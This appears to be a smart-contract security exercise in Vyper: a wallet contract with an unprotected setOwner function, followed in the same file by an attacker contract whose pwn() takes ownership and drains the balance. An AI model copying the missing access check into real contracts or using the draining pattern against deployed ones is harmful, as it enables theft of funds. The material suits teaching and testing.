# @version 0.3.9

owner: public(address)


@external
@payable
def __init__():
    self.owner = msg.sender


@external
@payable
def __default__():
    pass


@external
def withdraw():
    assert msg.sender == self.owner, "not owner"
    send(self.owner, self.balance)


@external
def setOwner(owner: address):
    self.owner = owner
    
interface Target:
    def withdraw(): nonpayable
    def setOwner(owner: address): nonpayable


target: public(Target)


@external
def __init__(target: address):
    self.target = Target(target)


@external
@payable
def __default__():
    pass


@external
def pwn():
    self.target.setOwner(self)
    self.target.withdraw()
    send(msg.sender, self.balance)
